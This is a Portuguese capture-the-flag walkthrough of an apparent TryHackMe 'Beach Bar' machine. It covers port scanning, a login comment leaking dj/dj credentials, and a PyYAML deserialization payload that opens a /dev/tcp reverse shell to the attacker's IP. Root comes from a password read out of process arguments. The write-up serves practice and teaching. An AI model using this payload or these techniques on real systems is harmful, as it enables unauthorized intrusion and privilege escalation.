#ctfs 

Primeiro, começamos com um scan de portas no IP fornecido

```shell
└─$ nmap 10.64.174.179 -Pn --open -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-22 16:32 -03
Nmap scan report for 10.64.174.179
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 44.10 seconds

```

```shell
└─$ nmap 10.64.174.179 -Pn --open -p 22,80 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-22 16:34 -03
Nmap scan report for 10.64.174.179
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds
```

De posse dessas informações, vamos enumerar o serviço Web.
# Enumeração

## Serviço Web

Em `http://10.64.174.179/login` nos deparamos com a seguinte página:

![Página de login do Beach Bar](Imagens/Pasted%20image%2020260922181600.png)


```shell
└─$ whatweb http://10.64.174.179/login     
http://10.64.174.179/login [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.64.174.179], PasswordField[password], Title[Beach Bar // Sign in]
```

Podemos enumerar diretórios a partir daqui

```shell
└─$ dirsearch -u http://10.64.174.179 -w /usr/share/wordlists/dirb/big.txt -x 404,500 -r       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                    
 (_||| _) (/_(_|| (_| )                                                             
                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 20469

Output File: /home/pentecostes/reports/http_10.64.174.179/_26-09-22_18-19-34.txt

Target: http://10.64.174.179/

[18:19:34] Starting:                                                                
[18:22:10] 200 -    3KB - /login                                            
                                                                              
Task Completed  
```

Apenas a página de login.

Ao inspecionarmos o código fonte da página de login encontramos um comentário interessante

```shell
<div class="card" style="max-width:420px;margin:48px auto;">
  <h1>DJ booth sign-in</h1>
  <p class="muted">Manage the jukebox playlists for tonight's set.</p>
  <!--
    staff note: the demo DJ login is still enabled for the soft opening.
    dj / dj  -- swap this before the season starts (ticket BAR-7)
  -->
  <form method="post">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" autocomplete="off" autofocus>
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autocomplete="off">
    <button type="submit">Step up to the decks</button>
  </form>
</div>
```

Temos uma credencial! dj:dj. Assim, conseguimos logar na aplicação

`http://10.64.174.179/dashboard`

![Dashboard do Beach Bar](Imagens/Pasted%20image%2020260922184426.png)

Perceba que há um formulário para envio de dados. Podemos tentar enviar um código malicioso nele.

Ao tentarmos enviar um texto qualquer aparece a seguinte mensagem de texto na tela:

```shell
Could not load playlist: mapping values are not allowed here
  in "<unicode string>", line 10, column 51:
     ... spects the GPL version 2 applies:
```

# Exploração

Precisamos enviar um texto em YAML de forma a conseguirmos explorar com precisão. Após algumas tentativas frustradas chegamos ao seguinte código:

![Payload YAML aceito pela aplicação](Imagens/Pasted%20image%2020260922191533.png)

Ok, o código funciona, vamos adaptar o payload para obtermos uma shell reversa.

```yaml
playlist:
  name: !!python/object/new:tuple
    - !!python/object/new:map
      - !!python/name:eval
      - ["__import__('subprocess').check_output(
    [  '/bin/bash',
  '-c',
  '/bin/bash -i >& /dev/tcp/[Meu IP]/4444 0>&1'],
    stderr=__import__('subprocess').STDOUT,
    text=True
)"]
songs: []
```

# Pós-exploração

Ao abrirmos uma porta em nossa máquina recebemos a seguinte conexão:

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.192.82] from (UNKNOWN) [10.64.174.179] 60994
bash: cannot set terminal process group (614): Inappropriate ioctl for device
bash: no job control in this shell
bartender@tryhackme-2404:/opt/beach-bar/webapp$ whoami
whoami
bartender
```

Daqui pegamos flag de user no diretório `/home/bartender`, por falha minha, esqueci de registrar o passo.

Após isso, aproveitei que estou no usuário `bartender` e passei para uma shell estável via chave pública do SSH criada na minha máquina.

```shell
└─$ ssh -i id_pwn bartender@10.64.174.179        
The authenticity of host '10.64.174.179 (10.64.174.179)' can't be established.
ED25519 key fingerprint is: SHA256:L+gJnSam1ZSjQxXrFFBR1GYzBVr+bB3tK4cJUwXMUpE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.64.174.179' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1009-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 22 22:38:03 UTC 2026

  System load:  0.0                Temperature:           -273.1 C
  Usage of /:   18.0% of 19.31GB   Processes:             115
  Memory usage: 8%                 Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: 10.64.174.179

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

bartender@tryhackme-2404:~$ 
```

Podemos inspecionar os arquivos do site

```shell
bartender@tryhackme-2404:/var$ cd /opt
bartender@tryhackme-2404:/opt$ ls
beach-bar
bartender@tryhackme-2404:/opt$ cd beach-bar
bartender@tryhackme-2404:/opt/beach-bar$ ls
jukeboxd  venv  webapp
bartender@tryhackme-2404:/opt/beach-bar$ cd jukeboxd
bartender@tryhackme-2404:/opt/beach-bar/jukeboxd$ ls -la
total 12
drwxr-xr-x 2 systemd-coredump ubuntu 4096 Jun 11 13:00 .
drwxr-xr-x 5 systemd-coredump ubuntu 4096 Jun 11 13:21 ..
-rw-r--r-- 1 systemd-coredump ubuntu  623 Jun 11 13:00 jukeboxd.py

```

Estranho ter um arquivo python por aqui, vamos ver seu código

```shell
bartender@tryhackme-2404:/opt/beach-bar/jukeboxd$ cat jukeboxd.py
#!/usr/bin/env python3

import argparse
import time

NOW_PLAYING = [
    "Khruangbin - Maria Tambien",
    "Men I Trust - Show Me How",
    "Crumb - Locket",
    "Mac DeMarco - Chamber of Reflection",
]


def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()

    i = 0
    while True:
        track = NOW_PLAYING[i % len(NOW_PLAYING)]
        i += 1
        time.sleep(30)


if __name__ == "__main__":
    main()
```

Observe como o código funciona, basicamente você passa um argumento de senha (`parser.add_argument("--stream-pass", required=True)`) para o programa. O problema é que ele pode ser visto por outros usuários se analisarmos o processo rodando. Faremos isso

```shell
bartender@tryhackme-2404:/opt/beach-bar/jukeboxd$ pgrep -af jukebox
613 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass [senha] --bitrate 320k
```

Ótimo, temos uma credencial, vamos tentar pegar root.

```shell
bartender@tryhackme-2404:/opt/beach-bar/jukeboxd$ su root
Password: 
root@tryhackme-2404:/opt/beach-bar/jukeboxd# cat /root/root.txt
[flag root.txt]
```
